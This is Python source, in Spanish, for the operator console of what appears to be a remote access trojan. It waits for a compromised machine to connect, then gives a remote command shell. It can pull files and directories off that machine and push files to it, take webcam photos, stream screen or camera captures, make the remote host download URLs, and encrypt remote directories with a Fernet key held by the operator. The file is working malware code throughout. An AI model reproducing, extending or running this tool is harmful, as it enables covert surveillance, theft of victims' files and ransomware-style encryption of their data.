import socket
import os
import re
import pickle
import struct
import cv2
import numpy
from time import sleep
from colorama import init
from colorama.ansi import Fore
from cryptography.fernet import Fernet
from udp import UDP

init(autoreset=True)

class TCP:
    def __init__(self, host, port):
        self.__host = host
        self.__port = port
        self.__chunk = 4194304

        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.__sock.bind((self.__host, self.__port))
        self.__sock.listen(1)
        print(Fore.CYAN + f"[*] Esperando conexion en el puerto {self.__port}")

        self.__conexion, self.__addr = self.__sock.accept()
        print(Fore.GREEN + f"[+] Conexion establecida con {self.__addr[0]}")

        sleep(0.05)
        self.initDir = os.getcwd()
        self.pics = 0
        info = self.__conexion.recv(1024).decode()
        info = info.split('\n')
        self.__userName = info[0]
        self.__hostName = info[1]
        self.__currentDir = info[2]

    def terminal(self):
        print(Fore.GREEN + "\u250c\u2500\u2500(" + Fore.BLUE + f"{self.__userName}~{self.__hostName}" + Fore.GREEN + ")-[" + Fore.WHITE + self.__currentDir + Fore.GREEN + ']')
        print(Fore.GREEN + "\u2514\u2500" + Fore.BLUE + "> ", end='')

    def getNombre(self, ubicacion):
        nombre = os.path.abspath(ubicacion)
        nombre = os.path.basename(nombre)
        return nombre

    def generarClave(self, clave):
        key = Fernet.generate_key()

        with open(clave, 'wb') as keyFile:
            keyFile.write(key)
        keyFile.close()
        print(Fore.GREEN + f"[+] Clave \"{clave}\" generada")

    def cargarClave(self, clave):
        return open(clave, 'rb').read()

    def escalar(self, height, width):
        if height > width:
            escala = 600/height
        elif width > height:
            escala = 600/width
        else:
            escala = (height+width)/2
            escala = 600/escala

        return escala

    def enviarDatos(self, info):
        info = pickle.dumps(info)
        info = struct.pack('Q', len(info))+info
        self.__conexion.sendall(info)

    def recibirDatos(self):
        data = b''
        size = struct.calcsize('Q')
        while len(data) < size:
            info = self.__conexion.recv(self.__chunk)
            data += info

        dataSize = data[:size]
        data = data[size:]
        byteSize = struct.unpack('Q', dataSize)[0]

        while len(data) < byteSize:
            data += self.__conexion.recv(self.__chunk)

        info = data[:byteSize]
        data = data[byteSize:]
        info = pickle.loads(info)

        return info

    def enviarArchivo(self, ubicacion):
        peso = os.path.getsize(ubicacion)
        paquetes = int(peso/self.__chunk)
        if paquetes == 0:
            paquetes = 1
        print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")

        sleep(0.1)
        i = 0
        with open(ubicacion, 'rb') as archivo:
            info = archivo.read(self.__chunk)
            while info:
                self.enviarDatos(info)
                info = archivo.read(self.__chunk)
                print(f"Paquete {i} enviado", end='\r')
                i += 1
                msg = self.__conexion.recv(8).decode()
                if msg == "end":
                    break
        archivo.close()

        print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" enviado")

    def recibirArchivo(self, ubicacion):
        paquetes = int(self.__conexion.recv(1024).decode())
        if paquetes == 0:
            paquetes = 1
        print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")

        i = 0
        with open(ubicacion, 'wb') as archivo:
            while True:
                info = self.recibirDatos()
                archivo.write(info)

                if len(info) < self.__chunk:
                    self.__conexion.send("end".encode())
                    break
                else:
                    self.__conexion.send("ok".encode())
                    print(f"Paquete {i+1} recibido", end='\r')
                    i += 1
        archivo.close()
        print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" creado")

    def enviarDirectorio(self, cmd, origen, index):
        archivos = []
        for i in os.listdir(origen):
            archivo = f"{origen}/{i}"
            if os.path.isfile(archivo):
                archivos.append(archivo)
        tam = len(archivos)
        print(Fore.CYAN + f"[*] Numero de archivos: {tam}")

        sleep(0.1)
        self.__conexion.send(str(tam).encode())

        if index > tam:
            index = 1
        subidos = 0
        while index <= tam:
            nombre = self.getNombre(archivos[index-1])
            peso = os.path.getsize(archivos[index-1])
            paquetes = int(peso/self.__chunk)

            if re.search("-a[= ]", cmd):
                print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
                res = 'S'
            else:
                if peso > 0:
                    print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Subir \"{nombre}\" ({paquetes})?...\n[S/n] ", end='')
                    res = input()
                else:
                    print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido ({nombre}, {paquetes})")
                    res = 'N'

            sleep(0.05)
            if len(res) == 0 or res.upper() == 'S':
                self.__conexion.send('S'.encode())
                sleep(0.05)
                self.__conexion.send(nombre.encode())
                self.enviarArchivo(archivos[index-1])
                subidos += 1
                msg = self.__conexion.recv(1024).decode()
                if msg[:6] == "error:":
                    print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
                    break

            elif res.lower() == 'q' or res.lower() == "quit":
                self.__conexion.send("quit".encode())
                break

            else:
                self.__conexion.send('N'.encode())

            index += 1
            sleep(0.05)

        print(Fore.GREEN + f"[+] {subidos} archivos subidos de {tam}")

    def recibirDirectorio(self, cmd, destino, index):
        if not os.path.isdir(destino):
            os.mkdir(destino)
        tam = int(self.__conexion.recv(1024).decode())
        print(Fore.CYAN + f"[*] Numero de archivos: {tam}")

        if index > tam:
            index = 1
        bajados = 0
        while index <= tam:
            info = self.__conexion.recv(1024).decode()
            info = info.split('\n')
            nombre, paquetes, peso = info[:3]
            peso = int(peso)

            if re.search("-a[= ]", cmd):
                print(Fore.MAGENTA + f"{index}/{tam}. ", end='')
                res = 'S'
            else:
                if peso > 0:
                    print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Bajar \"{nombre}\" (-p{paquetes}, -s{peso})?...\n[S/n] ", end='')
                    res = input()
                else:
                    print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido (-p{paquetes}, -s{peso})")
                    res = 'N'

            if len(res) == 0 or res.upper() == 'S':
                try:
                    self.__conexion.send('S'.encode())
                    self.recibirArchivo(f"{destino}/{nombre}")
                    bajados += 1
                    sleep(0.08)
                    self.__conexion.send("ok".encode())
                except:
                    self.__conexion.send("error".encode())
            elif res.lower() == 'q' or res.lower() == "quit":
                self.__conexion.send("quit".encode())
                break
            else:
                self.__conexion.send('N'.encode())

            index += 1

        print(Fore.GREEN + f"[+] {bajados} archivos descargados de {tam}")

    def local(self, cmd):
        if cmd.lower()[:2] == "cd":
            directorio = cmd[3:]
            if os.path.isdir(directorio):
                os.chdir(directorio)
                print(os.getcwd())

            else:
                print(Fore.YELLOW + f"[!] Directorio \"{directorio}\" no encontrado")

        else:
            os.system(cmd)

    def exit(self, cmd):
        print(Fore.MAGENTA + f"[?] Segur@ que quieres terminar la conexion con {self.__addr}?...\n[S/n] ", end='')
        res = input()

        if len(res) == 0 or res.upper() == 'S':
            self.__conexion.send(cmd.encode())
            self.__conexion.close()
            self.__sock.close()
            print(Fore.YELLOW + f"[!] Conexion terminada con {self.__userName}@{self.__addr[0]}")
            return True
        else:
            print(Fore.YELLOW + f"[!] Operacion cancelada")
            return False

    def cd(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1042).decode()
        if msg[:6] != "error:":
            if len(msg) > 40:
                msg = f"... {msg[-40:]}"
            self.__currentDir = msg
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    def sendFileFrom(self, cmd):
        if re.search("-d[= ]", cmd):
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            self.__conexion.send(cmd.encode())

            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                self.recibirArchivo(destino)

            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

        else:
            self.__conexion.send(cmd.encode())

            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                destino = self.__conexion.recv(1024).decode()
                self.recibirArchivo(destino)

            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    def sendFileTo(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]

            if os.path.isfile(origen):
                self.__conexion.send(cmd.encode())
                self.enviarArchivo(origen)

            else:
                print(Fore.YELLOW + f"[!] Archivo \"{origen}\" no encontrado")

        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

            if os.path.isfile(origen):
                self.__conexion.send(cmd.encode())
                nombre = self.getNombre(origen)

                sleep(0.05)
                self.__conexion.send(nombre.encode())
                self.enviarArchivo(origen)

            else:
                print(Fore.YELLOW + f"[!] Archivo \"{origen}\" no encontrado")

    def image(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            nombre = self.__conexion.recv(1024).decode()
            info = self.recibirDatos()

            matriz = numpy.frombuffer(info, dtype=numpy.uint8)
            imagen = cv2.imdecode(matriz, -1)

            if re.search("-t[= ]", cmd):
                escala = float(re.findall("-t[= ]([0-9.].*)", cmd)[0])
            else:
                height, width = imagen.shape[:2]
                escala = self.escalar(height, width)
            imagen = cv2.resize(imagen, None, fx=escala, fy=escala)
            print(f"Escala: {escala}")

            if re.search("-90", cmd):
                imagen = cv2.rotate(imagen, cv2.ROTATE_90_COUNTERCLOCKWISE)
            if re.search("-180", cmd):
                imagen = cv2.rotate(imagen, cv2.ROTATE_180)
            if re.search("-270", cmd):
                imagen = cv2.rotate(imagen, cv2.ROTATE_90_CLOCKWISE)
            if re.search("-x", cmd):
                imagen = cv2.flip(imagen, 0)
            if re.search("-y", cmd):
                imagen = cv2.flip(imagen, 1)
            if re.search("-g", cmd):
                imagen = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
            if re.search("-n", cmd):
                imagen = 255 - imagen
            if re.search("-m", cmd):
                flip = cv2.flip(imagen, 1)
                imagen = numpy.hstack((imagen, flip))
            if re.search("-c", cmd):
                grises = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
                blur = cv2.GaussianBlur(grises, (3,3), 0)
                t1 = int(input("Threshold1: "))
                t2 = int(input("Threshold2: "))
                canny = cv2.Canny(image=blur, threshold1=t1, threshold2=t2)
                imagen = cv2.cvtColor(canny, cv2.COLOR_GRAY2BGR)

            print(f"{self.__userName}@{self.__addr[0]}: {nombre}")
            cv2.imshow(f"{self.__userName}@{self.__addr[0]}: {nombre}", imagen)
            cv2.waitKey()
            cv2.destroyAllWindows()

        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    def pic(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            info = self.recibirDatos()

            matriz = numpy.frombuffer(info, dtype=numpy.uint8)
            imagen = cv2.imdecode(matriz, -1)

            height, width = imagen.shape[:2]
            escala = self.escalar(height, width)
            imagen = cv2.resize(imagen, None, fx=escala, fy=escala)

            print(f"Escala: {escala}")
            cv2.imshow(f"{self.__userName}@{self.__addr[0]}: Foto", imagen)
            cv2.waitKey()
            cv2.destroyAllWindows()

            if re.search("-s", cmd):
                if not os.path.isdir(f"{self.initDir}/pics"):
                    os.mkdir(f"{self.initDir}/pics")
                fotoRuta = f"{self.initDir}/pics/pic{self.pics}.jpg"
                cv2.imwrite(fotoRuta, imagen)
                print(Fore.GREEN + f"[+] Foto \"{fotoRuta}\" guardada")
                self.pics += 1
        
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    def captura(self, cmd):
        udp = UDP(self.__host, self.__port)
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6].lower() != "error:":
            try:
                udp.conectar()
                udp.captura(self.__userName)
                sleep(0.5)
                udp.close()
                msg = self.__conexion.recv(1024).decode()
                print(msg)
            except:
                udp.close()
                msg = self.__conexion.recv(1024).decode()
                print(msg)
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    def sendDirFrom(self, cmd):
        if re.search("-d[= ]", cmd):
            if re.search("-i[= ]", cmd):
                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                index = 1

            self.__conexion.send(cmd.encode())
            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                self.recibirDirectorio(cmd, destino, index)
            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

        else:
            if re.search("-i[= ]", cmd):
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                index = 1

            self.__conexion.send(cmd.encode())
            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                destino = self.__conexion.recv(1024).decode()
                self.recibirDirectorio(cmd, destino, index)
            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    def sendDirTo(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
            if re.search("-i[= ]", cmd):
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                index = 1

            if os.path.isdir(origen):
                self.__conexion.send(cmd.encode())
                self.enviarDirectorio(cmd, origen, index)
            else:
                print(Fore.YELLOW + f"Directorio \"{origen}\" no encontrado")

        else:
            if re.search("-i[= ]", cmd):
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                index = 1

            if os.path.isdir(origen):
                self.__conexion.send(cmd.encode())
                sleep(0.05)
                destino = self.getNombre(origen)
                self.__conexion.send(destino.encode())
                self.enviarDirectorio(cmd, origen, index)
            else:
                print(Fore.YELLOW + f"Directorio \"{origen}\" no encotrado")

    def comprimir(self, cmd):
        self.__conexion.send(cmd.encode())
        msg = self.__conexion.recv(1024).decode()

        if msg[:6] != "error:":
            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    def descomprimir(self, cmd):
        self.__conexion.send(cmd.encode())
        msg = self.__conexion.recv(1024).decode()

        if msg[:6] != "error:":
            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    def encrypt(self, cmd):
        clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -e", cmd)[0]
        directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
        if clave.endswith(".key"):
            self.generarClave(f"{clave}")
            key = self.cargarClave(f"{clave}")

            self.__conexion.send(cmd.encode())
            sleep(0.05)
            self.__conexion.send(key)

            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                nombre = msg.split('\n')[1]
                print(Fore.MAGENTA + f"[?] Segur@ que quieres encriptar el directorio \"{nombre}\"?...\n[S/n] ", end='')
                res = input()

                if len(res) == 0 or res.upper() == 'S':
                    self.__conexion.send('S'.encode())

                    msg = self.__conexion.recv(1024).decode()
                    if msg[:6] != "error:":
                        print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
                        self.recibirArchivo(f"{self.initDir}/{clave}.dat")
                    else:
                        print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

                else:
                    self.__conexion.send('N'.encode())
                    msg = self.__conexion.recv(1024).decode()
                    print(Fore.YELLOW + f"[!] {self.__userName}@{self.__addr[0]}: {msg}")

            else:
                print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

        else:
            print(Fore.YELLOW + f"[!] Error al crear la clave \"{clave}\"")

    def decrypt(self, cmd, clave):
        if os.path.isfile(clave) and clave.endswith(".key"):
            print(Fore.MAGENTA + f"[?] Segur@ que quieres usar la clave \"{clave}\"?...\n[S/n] ", end='')
            res = input()

            if len(res) == 0 or res.upper() == 'S':
                key = self.cargarClave(clave)
                self.__conexion.send(cmd.encode())
                sleep(0.05)
                self.__conexion.send(key)

                msg = self.__conexion.recv(1024).decode()
                if msg[:6] != "error:":
                    nombre = msg.split('\n')[1]
                    print(Fore.MAGENTA + f"[?] Segur@ que quieres desencriptar el directorio \"{nombre}\"?...\n[S/n] ", end='')
                    res = input()

                    if len(res) == 0 or res.upper() == 'S':
                        self.__conexion.send('S'.encode())

                        msg = self.__conexion.recv(1024).decode()
                        if msg[:6] != "error:":
                            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
                            self.recibirArchivo(f"{self.initDir}/{self.getNombre(clave)}.dat")
                            os.remove(f"{clave}")
                            print(Fore.YELLOW + f"[!] Clave \"{clave}\" eliminada")

                        else:
                            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

                    else:
                        self.__conexion.send('N'.encode())
                        msg = self.__conexion.recv(1024).decode()
                        print(Fore.YELLOW + f"[!] {self.__userName}@{self.__addr[0]}: {msg}")

                else:
                    print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

            else:
                print(Fore.YELLOW + f"[!] Desencriptacion cancelada")
        else:
            print(Fore.YELLOW + f"[!] Clave \"{clave}\" no encontrada")

    def wget(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1024).decode()
        if msg[:6] != "error:":
            print(Fore.GREEN + f"[+] {self.__userName}@{self.__addr[0]}: {msg}")
        else:
            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")

    def shell(self):
        try:
            while True:
                self.terminal()
                cmd = input()

                if cmd == '' or cmd.replace(' ', '') == '':
                    print(Fore.YELLOW + f"[!] Comando invalido")

                elif cmd[0] == '!':
                    try:
                        self.local(cmd[1:])

                    except:
                        print(Fore.RED + "[-] Error de sintaxis local")

                elif cmd.lower() == "clear" or cmd.lower() == "cls" or cmd.lower() == "clc":
                    os.system("clear")

                elif cmd.lower() == "exit":
                    try:
                        salir = self.exit(cmd)
                        if salir:
                            break

                    except:
                        print(Fore.RED + "[-] Error al terminar la conexion")

                elif cmd.lower() == 'q' or cmd.lower() == "quit":
                    try:
                        self.__conexion.send(cmd.encode())
                        self.__conexion.close()
                        self.__sock.close()
                        break

                    except:
                        print(Fore.RED + "[-] Error al cerrar el programa")

                elif cmd.lower()[:2] == "cd":
                    try:
                        self.cd(cmd)

                    except:
                        print(Fore.RED + "[-] Error de proceso (cd)")

                elif cmd.lower()[:3] == "sff":
                    try:
                        if re.search("-o[= ]", cmd):
                            self.sendFileFrom(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (sff)")

                elif cmd.lower()[:3] == "sft":
                    try:
                        if re.search("-o[= ]", cmd):
                            self.sendFileTo(cmd)
                        else:
                            print(Fore.RED + "[!] Falta del parametro de origen (-o)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (sft)")

                elif cmd.lower()[:3] == "img":
                    try:
                        if re.search("-i[= ]", cmd) or re.search("-r", cmd):
                            self.image(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro imagen (-i)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (img)")

                elif cmd.lower()[:3] == "pic":
                    try:
                        if re.search("-c[= ]", cmd):
                            self.pic(cmd)
                        
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")
                    
                    except:
                        print(Fore.RED + "[-] Error de proceso (pic)")

                elif cmd.lower()[:3] == "cap":
                    try:
                        if re.search("-c[= ]", cmd):
                            self.captura(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (cap)")

                elif cmd.lower()[:3] == "sdf":
                    try:
                        if re.search("-o[= ]", cmd):
                            self.sendDirFrom(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro origen (-o)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (sdf)")

                elif cmd.lower()[:3] == "sdt":
                    try:
                        if re.search("-o[= ]", cmd):
                            self.sendDirTo(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro origen (-o)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (sdt)")

                elif cmd.lower()[:3] == "zip":
                    try:
                        if re.search("-o[= ]", cmd):
                            self.comprimir(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (zip)")

                elif cmd.lower()[:5] == "unzip":
                    try:
                        if re.search("-o[= ]", cmd):
                            self.descomprimir(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (unzip)")

                elif cmd.lower()[:7] == "encrypt":
                    try:
                        if re.search("-k[= ]", cmd):
                            if re.search("-e[= ]", cmd):
                                self.encrypt(cmd)
                            else:
                                print(Fore.YELLOW + "[!] Falta del parametro encrypt (-e)")

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro key (-k)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (encrypt)")

                elif cmd.lower()[:7] == "decrypt":
                    try:
                        if re.search("-d[= ]", cmd):
                            if re.search("-k[= ]", cmd):
                                clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
                                self.decrypt(cmd, clave)
                            else:
                                print(Fore.YELLOW + "[!] Falta del parametro key (-k)")

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro decrypt (-d)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (decrypt)")

                elif cmd.lower()[:6] == "miwget":
                    try:
                        if re.search("-u[= ]", cmd):
                            self.wget(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro url (-u)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (miwget)")

                else:
                    try:
                        self.__conexion.send(cmd.encode())

                        while True:
                            info = self.__conexion.recv(self.__chunk)
                            info = ''.join([chr(i) for i in info])
                            print(info)

                            if len(info) < self.__chunk:
                                break

                    except:
                        print(Fore.RED + "[-] Error al ejecutar el comando")

        except Exception as e:
            print(e)
            print(Fore.RED + "Excepcion en el programa principal")
